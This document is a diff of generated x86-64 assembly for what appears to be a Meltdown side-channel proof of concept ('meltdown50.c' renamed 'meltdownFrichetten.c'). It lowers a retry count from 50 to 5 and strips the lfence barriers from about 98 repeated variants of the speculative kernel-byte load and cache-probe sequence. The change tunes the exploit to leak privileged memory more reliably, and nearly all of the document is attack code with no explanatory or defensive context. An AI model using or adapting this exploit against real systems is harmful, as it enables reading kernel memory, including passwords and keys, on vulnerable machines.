@@ -1,4 +1,4 @@
-	.file	"meltdown50.c"
+	.file	"meltdownFrichetten.c"
 	.text
 	.type	sigaction_segv, @function
 sigaction_segv:
@@ -45,7 +45,7 @@ probe_one:
 	movq	%fs:40, %rax
 	movq	%rax, -24(%rbp)
 	xorl	%eax, %eax
-	movl	$50, -2376(%rbp)
+	movl	$5, -2376(%rbp)
 	movl	$0, -2372(%rbp)
 	movl	$0, -2384(%rbp)
 	movl	$0, -2380(%rbp)
@@ -75,7 +75,7 @@ probe_one:
 	movq	%rax, -2352(%rbp)
 	movq	-2352(%rbp), %rax
 #APP
-# 106 "meltdown50.c" 1
+# 106 "meltdownFrichetten.c" 1
 	mfence
 	clflush	0(%rax)
 # 0 "" 2
@@ -92,7 +92,7 @@ probe_one:
 	movq	-2408(%rbp), %rdx
 	movq	-2416(%rbp), %rcx
 #APP
-# 158 "meltdown50.c" 1
+# 158 "meltdownFrichetten.c" 1
 	.global __speculative_byte_load_exit 
 	92:                              
 	xorq	%rax, %rax
@@ -1124,10 +1124,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 2
@@ -1135,10 +1133,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 3
@@ -1146,10 +1142,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 4
@@ -1157,10 +1151,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 5
@@ -1168,10 +1160,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 6
@@ -1179,10 +1169,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 7
@@ -1190,10 +1178,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 8
@@ -1201,10 +1187,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 9
@@ -1212,10 +1196,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 10
@@ -1223,10 +1205,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 11
@@ -1234,10 +1214,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 12
@@ -1245,10 +1223,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 13
@@ -1256,10 +1232,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 14
@@ -1267,10 +1241,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 15
@@ -1278,10 +1250,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 16
@@ -1289,10 +1259,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 17
@@ -1300,10 +1268,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 18
@@ -1311,10 +1277,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 19
@@ -1322,10 +1286,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 20
@@ -1333,10 +1295,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 21
@@ -1344,10 +1304,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 22
@@ -1355,10 +1313,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 23
@@ -1366,10 +1322,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 24
@@ -1377,10 +1331,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 25
@@ -1388,10 +1340,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 26
@@ -1399,10 +1349,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 27
@@ -1410,10 +1358,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 28
@@ -1421,10 +1367,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 29
@@ -1432,10 +1376,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 30
@@ -1443,10 +1385,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 31
@@ -1454,10 +1394,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 32
@@ -1465,10 +1403,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 33
@@ -1476,10 +1412,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 34
@@ -1487,10 +1421,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 35
@@ -1498,10 +1430,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 36
@@ -1509,10 +1439,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 37
@@ -1520,10 +1448,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 38
@@ -1531,10 +1457,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 39
@@ -1542,10 +1466,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 40
@@ -1553,10 +1475,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 41
@@ -1564,10 +1484,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 42
@@ -1575,10 +1493,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 43
@@ -1586,10 +1502,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 44
@@ -1597,10 +1511,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 45
@@ -1608,10 +1520,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 46
@@ -1619,10 +1529,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 47
@@ -1630,10 +1538,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 48
@@ -1641,10 +1547,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 49
@@ -1652,10 +1556,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 50
@@ -1663,10 +1565,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 51
@@ -1674,10 +1574,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 52
@@ -1685,10 +1583,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 53
@@ -1696,10 +1592,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 54
@@ -1707,10 +1601,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 55
@@ -1718,10 +1610,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 56
@@ -1729,10 +1619,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 57
@@ -1740,10 +1628,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 58
@@ -1751,10 +1637,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 59
@@ -1762,10 +1646,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 60
@@ -1773,10 +1655,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 61
@@ -1784,10 +1664,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 62
@@ -1795,10 +1673,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 63
@@ -1806,10 +1682,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 64
@@ -1817,10 +1691,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 65
@@ -1828,10 +1700,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 66
@@ -1839,10 +1709,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 67
@@ -1850,10 +1718,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 68
@@ -1861,10 +1727,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 69
@@ -1872,10 +1736,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 70
@@ -1883,10 +1745,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 71
@@ -1894,10 +1754,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 72
@@ -1905,10 +1763,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 73
@@ -1916,10 +1772,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 74
@@ -1927,10 +1781,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 75
@@ -1938,10 +1790,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 76
@@ -1949,10 +1799,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 77
@@ -1960,10 +1808,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 78
@@ -1971,10 +1817,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 79
@@ -1982,10 +1826,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 80
@@ -1993,10 +1835,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 81
@@ -2004,10 +1844,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 82
@@ -2015,10 +1853,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 83
@@ -2026,10 +1862,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 84
@@ -2037,10 +1871,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 85
@@ -2048,10 +1880,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 86
@@ -2059,10 +1889,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 87
@@ -2070,10 +1898,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 88
@@ -2081,10 +1907,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 89
@@ -2092,10 +1916,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 90
@@ -2103,10 +1925,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 91
@@ -2114,10 +1934,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 92
@@ -2125,10 +1943,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 93
@@ -2136,10 +1952,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 94
@@ -2147,10 +1961,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 95
@@ -2158,10 +1970,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 96
@@ -2169,10 +1979,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 97
@@ -2180,10 +1988,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 98
@@ -2191,10 +1997,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
